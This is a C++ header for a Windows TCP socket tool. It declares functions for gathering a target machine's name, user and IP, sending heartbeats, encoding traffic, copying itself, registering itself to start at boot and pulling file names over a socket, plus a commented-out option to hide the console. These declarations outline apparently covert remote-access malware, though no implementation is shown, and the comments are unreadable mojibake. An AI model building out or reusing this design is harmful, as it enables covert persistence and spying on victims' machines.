#pragma once
#ifndef _TCPSOCKET_H_
#define _TCPSOCKET_H_
#define _CRT_SECURE_NO_WARNINGS 1
#define _WINSOCK_DEPRECATED_NO_WARNINGS 1
#include <io.h>
#include <stdlib.h>
#include <vector>
#include <fstream>  //ifstream
#include <string>   //����getline()
#include <cmath>
#include <iostream>
#include <cstdlib>
#include <stdio.h>
#include <tchar.h>
#include <thread>
#include <atlimage.h>
#include <stdint.h>
#include <Windows.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

//����ʾ����̨��ɫ����
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define PORT 65533
//#define err(errMsg) printf("[line: %d]%s failed code %d\n", __LINE__, errMsg, WSAGetLastError())
#define Row BUFSIZ		//�����ȡ�ļ����Ķ�ά�����С

static const char BASE32_MAP[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=";
static const uint8_t BASE32_REVERSE_MAP[] =
{
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 26, 27, 28, 29, 30, 31, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 2, 3, 4, 5, 6,
		7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,
};


#ifndef CEIL_POS
#define CEIL_POS(X) (X > (uint64_t)(X) ? (uint64_t)(X+1) : (uint64_t)(X))
#endif
using namespace std;

struct PC_Message
{
	char PCName[BUFSIZ];
	TCHAR UserName[BUFSIZ];
	char IP[BUFSIZ];
};
//�������
bool init_Socket();
//�ر������
bool close_Socket();
//���������socket
SOCKET CreatServerScoket();
//�����ͻ���socket
SOCKET CreatClientScoket(const char* ip);
//��ȡĿ��������IP����������Լ��û���
bool getmessage(struct PC_Message* messages);
//��TCHAR������ת��Ϊchar
bool TcharToChar(const TCHAR* tchar, char* _char);
//��������
bool HeartBeat(SOCKET fd);
//base32���뺯��
void base32encode(char* str, uint64_t len);
//base32���뺯��
void base32decode(char* base32Str, uint64_t len);
//base64���뺯��
void base64encode(char* str);
//base64���뺯��
void base64decode(char* str);
//���ܺ���
void encode(char* text);
//���ܺ���
void decode(char* pwd);
//����������
int ComputerStart(char* pathName);
//charת��Ϊlpwstr
LPWSTR CharToLPWSTR(const char* szString);
//���Ҹ���
int copySelf(char* path);
//��ȡ�ļ���
void GetFileName(SOCKET fd, char FileName[Row], char* str);

#endif // !_TCPSOCKET_H